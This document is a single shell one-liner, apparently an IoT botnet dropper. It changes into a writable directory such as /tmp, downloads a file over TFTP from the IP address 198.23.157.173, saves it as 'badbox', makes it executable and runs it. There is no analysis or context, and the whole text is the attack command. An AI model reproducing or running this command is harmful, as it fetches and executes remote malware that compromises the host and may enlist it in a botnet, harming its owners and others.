cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 198.23.157.173;cat sh >badbox;chmod +x *;./badbox
